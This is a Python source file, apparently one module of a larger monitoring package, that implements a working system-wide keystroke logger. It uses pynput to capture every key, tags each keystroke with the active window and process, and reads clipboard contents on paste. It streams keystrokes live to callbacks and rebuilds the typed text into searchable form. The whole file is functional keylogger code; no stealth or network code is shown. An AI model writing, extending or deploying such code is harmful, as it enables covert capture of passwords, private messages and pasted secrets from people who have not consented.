"""
Keystroke Logger Module
Captures all keystrokes with context
"""
import re
import threading
import time
from datetime import datetime
from pynput import keyboard
from pynput.keyboard import Key

from ..config import KEYSTROKE_BUFFER_SIZE, KEYSTROKE_BUFFER_TIMEOUT, DEBUG_MODE

# Try to import clipboard module for paste content
try:
    import win32clipboard
    import win32con
    HAS_WIN32 = True
except ImportError:
    HAS_WIN32 = False


class KeystrokeLogger:
    """Captures and buffers keystrokes"""
    
    # Control character to letter mapping (Ctrl+A=\x01, Ctrl+B=\x02, etc.)
    CTRL_CHAR_MAP = {
        '\x01': 'A', '\x02': 'B', '\x03': 'C', '\x04': 'D', '\x05': 'E',
        '\x06': 'F', '\x07': 'G', '\x08': 'H', '\x09': 'I', '\x0a': 'J',
        '\x0b': 'K', '\x0c': 'L', '\x0d': 'M', '\x0e': 'N', '\x0f': 'O',
        '\x10': 'P', '\x11': 'Q', '\x12': 'R', '\x13': 'S', '\x14': 'T',
        '\x15': 'U', '\x16': 'V', '\x17': 'W', '\x18': 'X', '\x19': 'Y',
        '\x1a': 'Z',
    }
    
    # Special keys mapping
    SPECIAL_KEYS = {
        Key.space: ' ',
        Key.enter: '[ENTER]\n',
        Key.tab: '[TAB]',
        Key.backspace: '[BACKSPACE]',
        Key.delete: '[DELETE]',
        Key.esc: '[ESC]',
        Key.caps_lock: '[CAPSLOCK]',
        Key.shift: '[SHIFT]',
        Key.shift_r: '[SHIFT]',
        Key.ctrl_l: '[CTRL]',
        Key.ctrl_r: '[CTRL]',
        Key.alt_l: '[ALT]',
        Key.alt_r: '[ALT]',
        Key.cmd: '[WIN]',
        Key.cmd_r: '[WIN]',
        Key.up: '[UP]',
        Key.down: '[DOWN]',
        Key.left: '[LEFT]',
        Key.right: '[RIGHT]',
        Key.home: '[HOME]',
        Key.end: '[END]',
        Key.page_up: '[PGUP]',
        Key.page_down: '[PGDN]',
        Key.insert: '[INSERT]',
        Key.print_screen: '[PRTSC]',
        Key.scroll_lock: '[SCRLOCK]',
        Key.pause: '[PAUSE]',
        Key.num_lock: '[NUMLOCK]',
        Key.menu: '[MENU]',
    }
    
    # Function keys (F1-F20)
    F_KEYS = {}
    for i in range(1, 21):
        try:
            f_key = getattr(Key, f'f{i}', None)
            if f_key:
                F_KEYS[f_key] = f'[F{i}]'
        except Exception:
            pass
    
    # Numpad keys mapping - these come as vk codes in pynput
    # VK codes: 96-105 are numpad 0-9, 106-111 are operators
    NUMPAD_VK_MAP = {
        96: '[NUM0]', 97: '[NUM1]', 98: '[NUM2]', 99: '[NUM3]', 100: '[NUM4]',
        101: '[NUM5]', 102: '[NUM6]', 103: '[NUM7]', 104: '[NUM8]', 105: '[NUM9]',
        106: '[NUM*]', 107: '[NUM+]', 108: '[SEPARATOR]', 109: '[NUM-]',
        110: '[NUM.]', 111: '[NUM/]',
    }
    
    # Keys to ignore for live streaming (modifier keys that don't produce text)
    IGNORE_FOR_LIVE = {
        Key.shift, Key.shift_r,
        Key.ctrl_l, Key.ctrl_r,
        Key.alt_l, Key.alt_r,
        Key.caps_lock, Key.cmd, 
    }
    
    # Add cmd_r if it exists
    try:
        IGNORE_FOR_LIVE.add(Key.cmd_r)
    except AttributeError:
        pass
    
    @staticmethod
    def reconstruct_text(raw_keys: str) -> str:
        """
        Reconstruct the final typed text by applying backspaces/deletes.
        This makes the text searchable (e.g., "hello dear[BACKSPACE]x4 alex" -> "hello alex")
        Also handles paste content: [CTRL+V:"pasted text"] inserts the pasted text.
        """
        result = []
        i = 0
        
        while i < len(raw_keys):
            # Check for special keys
            if raw_keys[i] == '[':
                # Find the closing bracket - need to handle nested quotes for paste content
                end = i + 1
                bracket_depth = 1
                in_quotes = False
                
                while end < len(raw_keys) and bracket_depth > 0:
                    if raw_keys[end] == '"' and (end == 0 or raw_keys[end-1] != '\\'):
                        in_quotes = not in_quotes
                    elif raw_keys[end] == '[' and not in_quotes:
                        bracket_depth += 1
                    elif raw_keys[end] == ']' and not in_quotes:
                        bracket_depth -= 1
                    end += 1
                
                if bracket_depth == 0:
                    special = raw_keys[i:end]
                    
                    if special == '[BACKSPACE]':
                        # Remove last character if exists
                        if result:
                            result.pop()
                    elif special == '[CTRL+BACKSPACE]':
                        # Delete previous word (back to last space or start)
                        # First remove trailing spaces
                        while result and result[-1] == ' ':
                            result.pop()
                        # Then remove until we hit a space or start
                        while result and result[-1] != ' ':
                            result.pop()
                    elif special == '[DELETE]':
                        # DELETE typically removes char at cursor - for simplicity, ignore
                        pass
                    elif special == '[CTRL+DELETE]':
                        # Delete word forward - ignore in reconstruction
                        pass
                    elif special == '[ENTER]':
                        result.append('\n')
                    elif special == '[TAB]':
                        result.append('\t')
                    elif special.startswith('[CTRL+V:"') and special.endswith('"]'):
                        # Extract paste content and add it to result
                        paste_content = special[9:-2]  # Remove [CTRL+V:" and "]
                        result.extend(list(paste_content))
                    elif special.startswith('[WIN+V:"') and special.endswith('"]'):
                        # Extract paste content from Win+V and add it to result
                        paste_content = special[8:-2]  # Remove [WIN+V:" and "]
                        result.extend(list(paste_content))
                    elif special == '[SEL+DELETE]':
                        # Selection was deleted - we can't know cursor position
                        # so we can't accurately reconstruct. Leave text as-is.
                        # The raw keys field will show what really happened.
                        pass
                    elif special in ['[CTRL+ ]', '[SHIFT+ ]', '[ALT+ ]', '[WIN+ ]']:
                        # Space with modifier - still treat as space
                        result.append(' ')
                    elif special.startswith('[CTRL+SHIFT+') or special.startswith('[SHIFT+'):
                        # Selection operations don't produce text, skip them
                        pass
                    elif special.startswith('[CTRL+') or special.startswith('[ALT+') or special.startswith('[WIN+'):
                        # Other shortcuts don't produce text, skip them
                        pass
                    elif special.startswith('[NUM'):
                        # Numpad keys - extract the character
                        if special == '[NUM0]':
                            result.append('0')
                        elif special == '[NUM1]':
                            result.append('1')
                        elif special == '[NUM2]':
                            result.append('2')
                        elif special == '[NUM3]':
                            result.append('3')
                        elif special == '[NUM4]':
                            result.append('4')
                        elif special == '[NUM5]':
                            result.append('5')
                        elif special == '[NUM6]':
                            result.append('6')
                        elif special == '[NUM7]':
                            result.append('7')
                        elif special == '[NUM8]':
                            result.append('8')
                        elif special == '[NUM9]':
                            result.append('9')
                        elif special == '[NUM*]':
                            result.append('*')
                        elif special == '[NUM+]':
                            result.append('+')
                        elif special == '[NUM-]':
                            result.append('-')
                        elif special == '[NUM.]':
                            result.append('.')
                        elif special == '[NUM/]':
                            result.append('/')
                    # Other special keys (arrows, F-keys, etc.) don't add text
                    
                    i = end
                    # Handle newline after [ENTER]
                    if special == '[ENTER]' and i < len(raw_keys) and raw_keys[i] == '\n':
                        i += 1
                    continue
                else:
                    # Unclosed bracket, treat as regular character
                    result.append(raw_keys[i])
                    i += 1
                    continue
            
            # Regular character
            result.append(raw_keys[i])
            i += 1
        
        return ''.join(result)
    
    def __init__(self, event_callback, live_keystroke_callback=None, clipboard_callback=None):
        """
        Initialize keystroke logger
        
        Args:
            event_callback: Function to call with buffered keystroke events
            live_keystroke_callback: Optional callback for real-time individual keystrokes
            clipboard_callback: Optional callback for clipboard paste events
        """
        self.event_callback = event_callback
        self.live_keystroke_callback = live_keystroke_callback
        self.clipboard_callback = clipboard_callback
        self.buffer = []
        self.buffer_lock = threading.Lock()
        self.last_keystroke = time.time()  # Track last keystroke for inactivity detection
        self.active_window = None
        self.active_process = None
        self.listener = None
        self.flush_thread = None
        self.running = False
        
        # Modifier state
        self.shift_pressed = False
        self.ctrl_pressed = False
        self.alt_pressed = False
        self.win_pressed = False
        
        # Selection state - tracks if text is currently selected
        self.selection_active = False
        
        # Cache last clipboard content hash to avoid duplicate paste detection
        self.last_paste_hash = None
    
    def set_live_callback(self, callback):
        """Set or update the live keystroke callback"""
        self.live_keystroke_callback = callback
    
    def set_clipboard_callback(self, callback):
        """Set or update the clipboard callback"""
        self.clipboard_callback = callback
    
    def set_active_window(self, window_title: str, process_name: str):
        """Update the current active window context"""
        self.active_window = window_title
        self.active_process = process_name
    
    def _get_clipboard_text(self):
        """Get current text from clipboard for paste operations"""
        if not HAS_WIN32:
            return None
        
        try:
            win32clipboard.OpenClipboard()
            content = None
            
            if win32clipboard.IsClipboardFormatAvailable(win32con.CF_UNICODETEXT):
                content = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
            elif win32clipboard.IsClipboardFormatAvailable(win32con.CF_TEXT):
                content = win32clipboard.GetClipboardData(win32con.CF_TEXT)
                if isinstance(content, bytes):
                    content = content.decode('utf-8', errors='ignore')
            
            win32clipboard.CloseClipboard()
            return content
        except Exception as e:
            try:
                win32clipboard.CloseClipboard()
            except Exception:
                pass
            if DEBUG_MODE:
                print(f"Clipboard read error: {e}")
            return None
    
    def _get_vk_code(self, key):
        """Get virtual key code from key if available"""
        if hasattr(key, 'vk') and key.vk:
            return key.vk
        # Try to get from _value_ attribute (pynput internal)
        if hasattr(key, '_value_'):
            value = key._value_
            if hasattr(value, 'vk'):
                return value.vk
        return None
    
    def _on_press(self, key):
        """Handle key press event"""
        try:
            # Track modifier state
            if key in (Key.shift, Key.shift_r):
                self.shift_pressed = True
                return
            elif key in (Key.ctrl_l, Key.ctrl_r):
                self.ctrl_pressed = True
                return
            elif key in (Key.alt_l, Key.alt_r):
                self.alt_pressed = True
                return
            elif key == Key.cmd or (hasattr(Key, 'cmd_r') and key == Key.cmd_r):
                self.win_pressed = True
                return
            
            char = None
            paste_content = None
            
            # Check for F-keys first
            if key in self.F_KEYS:
                char = self.F_KEYS[key]
            # Check for numpad keys via vk code
            elif hasattr(key, 'vk') and key.vk in self.NUMPAD_VK_MAP:
                char = self.NUMPAD_VK_MAP[key.vk]
            # Get the character/key representation
            elif hasattr(key, 'char') and key.char:
                raw_char = key.char
                
                # Handle control characters (Ctrl+letter produces control codes)
                if self.ctrl_pressed and raw_char in self.CTRL_CHAR_MAP:
                    letter = self.CTRL_CHAR_MAP[raw_char]
                    
                    # Check for paste operation (Ctrl+V)
                    if letter == 'V':
                        paste_content = self._get_clipboard_text()
                        if paste_content:
                            # Create a hash to avoid duplicate paste detections
                            paste_hash = hash(paste_content[:1000] if len(paste_content) > 1000 else paste_content)
                            if paste_hash != self.last_paste_hash:
                                self.last_paste_hash = paste_hash
                                # Include the pasted content in the keystroke
                                if len(paste_content) > 200:
                                    display_paste = paste_content[:200] + '...'
                                else:
                                    display_paste = paste_content
                                char = f'[CTRL+V:"{display_paste}"]'
                            else:
                                char = '[CTRL+V]'
                        else:
                            char = '[CTRL+V]'
                    else:
                        char = f'[CTRL+{letter}]'
                elif self.alt_pressed and raw_char in self.CTRL_CHAR_MAP:
                    # Alt+letter combinations 
                    letter = self.CTRL_CHAR_MAP.get(raw_char, raw_char.upper() if len(raw_char) == 1 else raw_char)
                    char = f'[ALT+{letter}]'
                else:
                    char = raw_char
            elif key in self.SPECIAL_KEYS:
                char = self.SPECIAL_KEYS[key]
            else:
                # Try to extract vk code for unknown keys
                vk = self._get_vk_code(key)
                if vk and vk in self.NUMPAD_VK_MAP:
                    char = self.NUMPAD_VK_MAP[vk]
                else:
                    # Format unknown keys more cleanly
                    key_str = str(key)
                    if key_str.startswith('<') and key_str.endswith('>'):
                        # Extract the vk code from <XX> format
                        try:
                            vk_num = int(key_str[1:-1])
                            if vk_num in self.NUMPAD_VK_MAP:
                                char = self.NUMPAD_VK_MAP[vk_num]
                            else:
                                char = f'[VK{vk_num}]'
                        except ValueError:
                            char = f'[{key_str}]'
                    else:
                        char = f'[{key_str}]'
            
            # Handle Win+V (clipboard history)
            if self.win_pressed and char and 'V' in char.upper():
                paste_content = self._get_clipboard_text()
                if paste_content:
                    if len(paste_content) > 200:
                        display_paste = paste_content[:200] + '...'
                    else:
                        display_paste = paste_content
                    char = f'[WIN+V:"{display_paste}"]'
                else:
                    char = '[WIN+V]'
            
            # Add modifier prefixes for shortcuts (if not already handled)
            # Don't convert space to a shortcut - it should always be a space
            if char and not char.startswith('[') and char != ' ':
                if self.ctrl_pressed:
                    char = f'[CTRL+{char.upper()}]'
                elif self.alt_pressed:
                    char = f'[ALT+{char.upper()}]'
                elif self.win_pressed:
                    char = f'[WIN+{char.upper()}]'
            elif char and char.startswith('[') and not any(x in char for x in ['CTRL+', 'ALT+', 'WIN+', 'SHIFT+']):
                # Handle special keys with modifiers
                # Check for Ctrl+Shift combinations FIRST (before Ctrl-only)
                if self.ctrl_pressed and self.shift_pressed:
                    if char in ['[LEFT]', '[RIGHT]', '[UP]', '[DOWN]', '[HOME]', '[END]']:
                        # Ctrl+Shift+Arrow = select by word
                        char = f'[CTRL+SHIFT+{char[1:-1]}]'
                        self.selection_active = True
                    elif char == '[BACKSPACE]':
                        char = '[CTRL+SHIFT+BACKSPACE]'
                    elif char == '[DELETE]':
                        char = '[CTRL+SHIFT+DELETE]'
                elif self.ctrl_pressed:
                    if char == '[BACKSPACE]':
                        char = '[CTRL+BACKSPACE]'
                    elif char == '[DELETE]':
                        char = '[CTRL+DELETE]'
                    elif char in ['[LEFT]', '[RIGHT]']:
                        # Ctrl+Arrow = word navigation
                        char = f'[CTRL+{char[1:-1]}]'
                elif self.shift_pressed:
                    if char in ['[LEFT]', '[RIGHT]', '[UP]', '[DOWN]', '[HOME]', '[END]']:
                        # Shift+Arrow/Home/End = selection
                        char = f'[SHIFT+{char[1:-1]}]'
                        self.selection_active = True
                
                # Track selection-based deletion
                if char in ['[BACKSPACE]', '[DELETE]'] and self.selection_active:
                    char = '[SEL+DELETE]'  # Mark as selection deletion
                    self.selection_active = False
                elif char not in ['[SHIFT+LEFT]', '[SHIFT+RIGHT]', '[SHIFT+UP]', '[SHIFT+DOWN]', 
                                   '[SHIFT+HOME]', '[SHIFT+END]', '[CTRL+SHIFT+LEFT]', '[CTRL+SHIFT+RIGHT]',
                                   '[CTRL+SHIFT+UP]', '[CTRL+SHIFT+DOWN]', '[CTRL+SHIFT+HOME]', '[CTRL+SHIFT+END]']:
                    # Any non-selection key clears the selection state
                    self.selection_active = False
            
            if char is None:
                return
            
            timestamp = datetime.now().isoformat()
            
            # Send live keystroke immediately if callback is set
            # Skip modifier-only keys that don't produce visible output
            if self.live_keystroke_callback and key not in self.IGNORE_FOR_LIVE:
                try:
                    self.live_keystroke_callback({
                        'timestamp': timestamp,
                        'event_type': 'live_keystroke',
                        'category': 'input',
                        'data': {
                            'key': char,
                            'target_window': self.active_window,
                            'target_process': self.active_process,
                            'paste_content': paste_content if paste_content else None
                        }
                    })
                except Exception as e:
                    if DEBUG_MODE:
                        print(f"Live keystroke error: {e}")
            
            # If this was a paste operation, also send a clipboard event
            if paste_content and self.clipboard_callback:
                try:
                    self.clipboard_callback({
                        'timestamp': timestamp,
                        'event_type': 'clipboard_paste',
                        'category': 'clipboard',
                        'data': {
                            'content': paste_content[:500] + '...[truncated]' if len(paste_content) > 500 else paste_content,
                            'content_type': 'text',
                            'content_length': len(paste_content),
                            'target_window': self.active_window,
                            'target_process': self.active_process
                        }
                    })
                except Exception as e:
                    if DEBUG_MODE:
                        print(f"Clipboard callback error: {e}")
            
            # Add to buffer for batched events (keeps phrase grouping for history)
            with self.buffer_lock:
                self.buffer.append({
                    'char': char,
                    'timestamp': timestamp,
                    'window': self.active_window,
                    'process': self.active_process,
                    'paste_content': paste_content
                })
                
                # Update last keystroke time for inactivity detection
                self.last_keystroke = time.time()
                
                # Flush if buffer is full
                if len(self.buffer) >= KEYSTROKE_BUFFER_SIZE:
                    self._flush_buffer()
                    
        except Exception as e:
            if DEBUG_MODE:
                print(f"Keystroke error: {e}")
                import traceback
                traceback.print_exc()
    
    def _on_release(self, key):
        """Handle key release event"""
        if key in (Key.shift, Key.shift_r):
            self.shift_pressed = False
        elif key in (Key.ctrl_l, Key.ctrl_r):
            self.ctrl_pressed = False
        elif key in (Key.alt_l, Key.alt_r):
            self.alt_pressed = False
        elif key == Key.cmd or (hasattr(Key, 'cmd_r') and key == Key.cmd_r):
            self.win_pressed = False
    
    def _flush_buffer(self):
        """Flush keystroke buffer to event callback"""
        with self.buffer_lock:
            if not self.buffer:
                return
            
            # Group keystrokes by window/process
            current_group = None
            groups = []
            
            for keystroke in self.buffer:
                key = (keystroke['window'], keystroke['process'])
                if current_group is None or current_group['key'] != key:
                    if current_group:
                        groups.append(current_group)
                    current_group = {
                        'key': key,
                        'chars': keystroke['char'],
                        'start_time': keystroke['timestamp'],
                        'end_time': keystroke['timestamp']
                    }
                else:
                    current_group['chars'] += keystroke['char']
                    current_group['end_time'] = keystroke['timestamp']
            
            if current_group:
                groups.append(current_group)
            
            # Send events
            for group in groups:
                window, process = group['key']
                raw_keys = group['chars']
                
                # Reconstruct the final text (applies backspaces/deletes)
                reconstructed = self.reconstruct_text(raw_keys)
                
                self.event_callback({
                    'timestamp': group['start_time'],
                    'event_type': 'keystroke',
                    'category': 'input',
                    'data': {
                        'keys': raw_keys,
                        'text': reconstructed,  # Final searchable text
                        'target_window': window,
                        'target_process': process,
                        'duration_chars': len(raw_keys)
                    }
                })
            
            self.buffer.clear()
            self.last_flush = time.time()
    
    def _flush_timer(self):
        """Background thread to flush buffer after inactivity timeout"""
        while self.running:
            time.sleep(1)
            # Flush only if there's been no typing for KEYSTROKE_BUFFER_TIMEOUT seconds
            # This ensures we capture complete phrases before sending
            with self.buffer_lock:
                has_content = len(self.buffer) > 0
            
            if has_content and (time.time() - self.last_keystroke >= KEYSTROKE_BUFFER_TIMEOUT):
                self._flush_buffer()
    
    def start(self):
        """Start the keystroke logger"""
        if self.running:
            return
        
        self.running = True
        
        # Start flush timer thread
        self.flush_thread = threading.Thread(target=self._flush_timer, daemon=True)
        self.flush_thread.start()
        
        # Start keyboard listener
        self.listener = keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release
        )
        self.listener.start()
        
        if DEBUG_MODE:
            print("Keystroke logger started")
    
    def stop(self):
        """Stop the keystroke logger"""
        self.running = False
        
        if self.listener:
            self.listener.stop()
            self.listener = None
        
        # Final flush
        self._flush_buffer()
        
        if DEBUG_MODE:
            print("Keystroke logger stopped")

